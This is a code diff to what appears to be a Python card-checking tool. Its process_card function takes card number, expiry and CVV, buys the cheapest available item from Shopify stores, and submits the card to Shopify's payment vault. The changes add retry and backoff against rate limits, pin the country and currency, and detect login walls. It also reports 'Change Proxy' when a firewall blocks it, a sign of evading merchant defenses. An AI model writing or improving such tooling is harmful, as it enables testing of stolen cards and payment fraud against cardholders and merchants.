@@ -143,7 +143,7 @@ SESSION_TIMEOUT    = 25
 VAULT_TIMEOUT      = 12
 RECEIPT_POLL_MAX   = 5
 RECEIPT_POLL_DELAY = 1.0
-P2_TOTAL_POLL_MAX  = 3
+P2_TOTAL_POLL_MAX  = 6
 P2_TOTAL_POLL_DELAY = 1.0
 
 GQL_RETRY_ATTEMPTS = 1
@@ -968,8 +968,10 @@ async def detect_currency_via_cartjs(session, domain, proxy, profile):
 
 async def detect_store_currency(session, domain, proxy, profile):
     tasks = [
-        asyncio.create_task(detect_currency_via_cartjs(session, domain, proxy, profile)),
+        # meta.json = the SHOP's real currency (immune to IP-geo presentment);
+        # cart.js reflects the session's geo-adjusted currency — fallback only
         asyncio.create_task(detect_currency_via_meta(session, domain, proxy, profile)),
+        asyncio.create_task(detect_currency_via_cartjs(session, domain, proxy, profile)),
     ]
     try:
         for coro in asyncio.as_completed(tasks):
@@ -1010,24 +1012,30 @@ async def fetch_cheapest_candidate(session, domain, profile, proxy):
         async with AsyncSession(impersonate="chrome", verify=False, timeout=15) as fetch_session:
             result = None
             for base_url in [f"{domain}/products.json", f"{domain}/collections/all/products.json"]:
-                try:
-                    r = await fetch_session.get(base_url, params={"limit": 250}, proxies=proxies, timeout=10)
-                    if r.status_code != 200:
-                        print(f"[candidates] {base_url} HTTP {r.status_code}")
-                        continue
-                    text = r.text
-                    if "shopify" not in text.lower():
-                        continue
-                    result = r.json().get("products") or []
-                    if result:
+                for _try in range(3):
+                    try:
+                        r = await fetch_session.get(base_url, params={"limit": 250}, proxies=proxies, timeout=10)
+                        if r.status_code == 429:
+                            await asyncio.sleep(1.5 + 1.5 * _try)
+                            continue
+                        if r.status_code != 200:
+                            print(f"[candidates] {base_url} HTTP {r.status_code}")
+                            break
+                        text = r.text
+                        if "shopify" not in text.lower():
+                            break
+                        result = r.json().get("products") or []
                         break
-                except Exception as e:
-                    print(f"[candidates] request error {base_url}: {str(e)[:100]}")
-                    continue
+                    except Exception as e:
+                        print(f"[candidates] request error {base_url}: {str(e)[:100]}")
+                        await asyncio.sleep(0.5)
+                if result:
+                    break
             if not result:
                 return None
 
             best, best_price = None, float("inf")
+            best_avail, best_avail_price = None, float("inf")
             for prod in result:
                 handle = prod.get("handle", "")
                 for v in prod.get("variants", []):
@@ -1035,17 +1043,29 @@ async def fetch_cheapest_candidate(session, domain, profile, proxy):
                         price = float(v.get("price", "0"))
                     except (ValueError, TypeError):
                         continue
-                    if price < MIN_PRICE or price >= best_price:
+                    if price < MIN_PRICE:
                         continue
-                    best_price = price
-                    best = {
-                        "variant_id": str(v.get("id", "")),
-                        "price": f"{price:.2f}",
-                        "handle": handle,
-                        "requires_shipping": v.get("requires_shipping", True),
-                    }
+                    if price < best_price:
+                        best_price = price
+                        best = {
+                            "variant_id": str(v.get("id", "")),
+                            "price": f"{price:.2f}",
+                            "handle": handle,
+                            "requires_shipping": v.get("requires_shipping", True),
+                        }
+                    if v.get("available") and price < best_avail_price:
+                        best_avail_price = price
+                        best_avail = {
+                            "variant_id": str(v.get("id", "")),
+                            "price": f"{price:.2f}",
+                            "handle": handle,
+                            "requires_shipping": v.get("requires_shipping", True),
+                        }
+            if best_avail:
+                print(f"[candidates] ✅ cheapest AVAILABLE {best_avail['variant_id']} @ {best_avail['price']}")
+                return best_avail
             if best:
-                print(f"[candidates] ✅ cheapest {best['variant_id']} @ {best['price']}")
+                print(f"[candidates] ✅ cheapest (none in stock) {best['variant_id']} @ {best['price']}")
                 return best
             return None
 
@@ -1140,6 +1160,8 @@ async def resolve_checkout_after_cart(session, domain, cart_html, proxy, profile
         r = await session.post(f"{domain}/cart", data=data, headers=post_h,
                                proxy=proxy, timeout=15, allow_redirects=False)
         loc = r.headers.get("Location") or r.headers.get("location")
+        if loc and "customer_authentication" in loc:
+            return None, "LOGIN_REQUIRED", None
         if loc:
             full = loc if loc.startswith("http") else f"{domain}{loc}"
             try:
@@ -1150,6 +1172,8 @@ async def resolve_checkout_after_cart(session, domain, cart_html, proxy, profile
                                        timeout=20, allow_redirects=True)
                 if "/checkouts/" in str(r2.url):
                     return str(r2.url), r2.text, r2
+                if "customer_authentication" in str(r2.url) or "authentication" in str(r2.url):
+                    return None, "LOGIN_REQUIRED", None
             except Exception: pass
     except Exception: pass
 
@@ -1440,18 +1464,19 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 variant_price_fallback = candidate["price"]
                 print(f"[candidate] cheapest variant={numeric_vid} price={candidate['price']}")
 
-            # localization: set the session's country/market to match the buyer identity
-            # (prevents BUYER_IDENTITY_PRESENTMENT_CURRENCY_DOES_NOT_MATCH at submit)
+            # 🔥 FIX: pin the session market/country + currency via cart permalink.
+            # The old /localization POST 404s on most stores, and IP-geo markets
+            # (e.g. IN on US stores) make the seller proposal UnavailableTerms.
+            loc_country = "US"
             try:
-                loc_country = addr.get("countryCode", "US") if isinstance(addr, dict) else "US"
-                loc_h = build_headers(profile, ourl, for_document=False)
-                loc_h["content-type"] = "application/x-www-form-urlencoded"
-                loc_h["referer"] = f"{ourl}/"
-                await session.post(f"{ourl}/localization",
-                                   data={"country_code": loc_country},
-                                   headers=loc_h, proxy=proxy, timeout=8)
-            except Exception:
-                pass
+                pin_h = build_headers(profile, ourl, for_document=True)
+                pin_h["referer"] = f"{ourl}/"
+                r_pin = await session.get(
+                    f"{ourl}/cart/{numeric_vid}:1?country={loc_country}&currency={currency}",
+                    headers=pin_h, proxy=proxy, timeout=12, allow_redirects=True)
+                print(f"[pin] country={loc_country} currency={currency} → {str(r_pin.url)[:90]}")
+            except Exception as e:
+                print(f"[pin] ⚠️ {str(e)[:80]}")
 
             add_referer = f"{ourl}/products/{product_handle}" if product_handle else f"{ourl}/"
             ok, payload = await storefront_cart_add(
@@ -1470,6 +1495,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             checkout_url, text, response = await resolve_checkout_after_cart(
                 session, ourl, cart_html, proxy, profile, currency)
             if not checkout_url or not response:
+                if text == "LOGIN_REQUIRED":
+                    return False, "Site requires login!", gateway, variant_price_fallback, currency
                 if is_waf_block(text or ""):
                     return False, "Change Proxy", gateway, variant_price_fallback, currency
                 return False, "Failed to get checkout URL", gateway, variant_price_fallback, currency
@@ -1717,7 +1744,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                         "options": {}
                     },
                     "targetMerchandiseLines": {"any": True},
-                    "deliveryMethodTypes": ["SHIPPING"],
+                    "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
                     "expectedTotalPrice": {"any": True}, 
                     "destinationChanged": True
                 }],
@@ -1885,7 +1912,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 print(f"[P1] ⚠️ UnavailableTerms — FULL RESPONSE:")
                 print(json.dumps(resp_json, indent=2)[:2000])
 
-            if dtype == "PendingTerms":
+            if dtype in ("PendingTerms", "UnavailableTerms"):
                 await asyncio.sleep(1.5)
                 response, resp_text = await gql(
                     session, "Proposal", headers, proposal_payload, proxy,
@@ -1934,7 +1961,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 delivery_line = {
                     "destination": {"streetAddress": dict(billing_street)},
                     "targetMerchandiseLines": _delivery_target(negotiated_stable_id),
-                    "deliveryMethodTypes": ["SHIPPING"],
+                    "deliveryMethodTypes": ["SHIPPING", "LOCAL"],
                     "expectedTotalPrice": {"any": True},
                     "destinationChanged": True
                 }
@@ -2006,6 +2033,16 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 proposal_variables["checkpointData"] = checkpoint_data
 
             amt = _extract_amounts_from_seller(_s2)
+            # fallback: buyer's runningTotal often resolves before the seller proposal
+            if not _positive_amount(amt["checkout_total"]) and not _positive_amount(amt["total"]):
+                _brt = ((_r2.get("buyerProposal") or {}).get("runningTotal") or {}).get("value") or {}
+                try:
+                    if float(_brt.get("amount") or 0) > 0:
+                        amt["total"] = str(_brt["amount"])
+                        if _brt.get("currencyCode"): currency = str(_brt["currencyCode"])
+                        print(f"[amount] P2 buyerRunningTotal fallback: {amt['total']}")
+                except (ValueError, TypeError):
+                    pass
             checkout_total = amt["checkout_total"]; total_amount = amt["total"]
             payment_identifier = amt["payment_identifier"] or None
             if amt["gateway"]: gateway = amt["gateway"]
@@ -2112,17 +2149,17 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 vh["shopify-identification-signature"] = ident_sig
 
             token = None; last_err = None
-            for _attempt in range(2):
+            for _attempt in range(4):
                 try:
                     r_v = await session.post(
                         "https://checkout.pci.shopifyinc.com/sessions",
                         json=vault_payload, headers=vh, proxy=proxy,
                         timeout=VAULT_TIMEOUT)
                     if r_v.status_code == 429:
-                        await asyncio.sleep(_throttle_wait(r_v, 3.0)); continue
+                        await asyncio.sleep(_throttle_wait(r_v, 4.0 + 2.0 * _attempt)); continue
                     if r_v.status_code not in (200, 201):
                         last_err = f"PCI HTTP {r_v.status_code}"
-                        await asyncio.sleep(0.8); continue
+                        await asyncio.sleep(1.2 + 0.8 * _attempt); continue
                     try: token = r_v.json().get("id")
                     except Exception:
                         last_err = "PCI bad JSON"; await asyncio.sleep(1.0); continue
